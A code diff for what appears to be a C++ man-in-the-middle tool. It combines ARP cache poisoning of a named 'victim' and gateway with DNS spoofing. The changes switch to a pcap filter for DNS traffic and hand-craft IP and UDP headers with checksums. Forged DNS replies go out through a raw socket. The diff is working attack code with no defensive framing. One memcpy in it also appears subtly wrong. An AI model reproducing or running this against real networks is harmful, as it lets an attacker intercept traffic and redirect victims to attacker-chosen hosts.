@@ -9,13 +9,14 @@
 #include "NetworkEngine.h"
 #include "UdpStack.h"
 
+#include "checksum.h"
 #include "dns.h"
 
 // get the interface name, ip of gateway and ip of victim
 // main program we need: interface name, ip of gateway, ip of victim
 // dns poison we need: domain to poison, what to poison too
 int main(int argc, const char *argv[]) {
-    const char *interfaceName = "wlp59s0";                        // get this from config file
+    const char *interfaceName = "eno1";                           // get this from config file
     std::unordered_map<std::string, std::string> domainsToPoison; // get this from config file
 
     unsigned char attackerMac[ETH_ALEN]; // get this from config file
@@ -98,38 +99,62 @@ int main(int argc, const char *argv[]) {
             ip = (iphdr *)(packet + 14);
             ipLen = ip->ihl * 4;
 
-            // check to see if it is udp
-            if (ip->protocol != IPPROTO_UDP) {
-                return;
-            }
-
             // get udp hdr and size
             udp = (udphdr *)(packet + 14 + ipLen);
             udpLen = UdpStack::UDP_HDR_LEN;
-
-            // check that it is a dns packet
-            if (ntohs(udp->source) != 53 && ntohs(udp->dest) != 53) {
-                return;
-            }
 
             // get dns header
             dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
 
             // craft the poisoned response
-            int responseSize = forgeDns(dns, &spoofIp, buffer);
-            UCharVector payload(responseSize);
-            memcpy(payload.data(), buffer, responseSize);
-
-            // get the addresses
-            struct in_addr src;
-            struct in_addr dst;
-            src.s_addr = ip->saddr;
-            dst.s_addr = ip->daddr;
+            int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
 
             // reply
-            ipEngine.sendUdp(dst, src, udp->dest, udp->source, payload);
+            struct iphdr *ipBuffer = (struct iphdr *)buffer;
+            struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
+
+            ipBuffer->ihl = 5;
+            ipBuffer->version = 4;
+            ipBuffer->tos = 0;
+            ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
+            ipBuffer->frag_off = 0;
+            ipBuffer->ttl = 64;
+            ipBuffer->protocol = IPPROTO_UDP;
+            ipBuffer->check = 0;
+            ipBuffer->saddr = ip->daddr;
+            ipBuffer->daddr = ip->saddr;
+            ipBuffer->check = in_cksum((unsigned short *)ipBuffer, ipBuffer->ihl * 4);
+
+            udpBuffer->source = udp->dest;
+            udpBuffer->dest = udp->source;
+            udpBuffer->len = htons(UdpStack::UDP_HDR_LEN + responseSize);
+
+            struct UdpPseudoHeader pseudo_header;
+            pseudo_header.srcAddr = ip->daddr;
+            pseudo_header.dstAddr = ip->saddr;
+            pseudo_header.placeholder = 0;
+            pseudo_header.protocol = IPPROTO_UDP;
+            pseudo_header.udpLen = udpBuffer->len;
+            memcpy((char *)&pseudo_header.udp, (char *)&udpBuffer, ntohs(udpBuffer->len));
+            udpBuffer->check =
+                in_cksum((unsigned short *)&pseudo_header, sizeof(struct UdpPseudoHeader));
+
+            short totalLen = ipBuffer->ihl * 4 + UdpStack::UDP_HDR_LEN + responseSize;
+            ipBuffer->tot_len = htons(totalLen);
+
+            int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+            struct sockaddr_in sin;
+            sin.sin_family = AF_INET;
+            sin.sin_port = udpBuffer->source;
+            sin.sin_addr.s_addr = ipBuffer->daddr;
+
+            sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin,
+                   sizeof(sin));
+
+            close(rawSocket);
         });
-    ipEngine.startSniff(NetworkEngine::IP_FILTER);
+    ipEngine.startSniff("udp and dst port domain");
 
     // start arp poisoning
     forgeArp(attackerMac, &gatewayIp, victimMac, &victimIp, &victimArp);
@@ -142,4 +167,3 @@ int main(int argc, const char *argv[]) {
 
     return 0;
 }
-
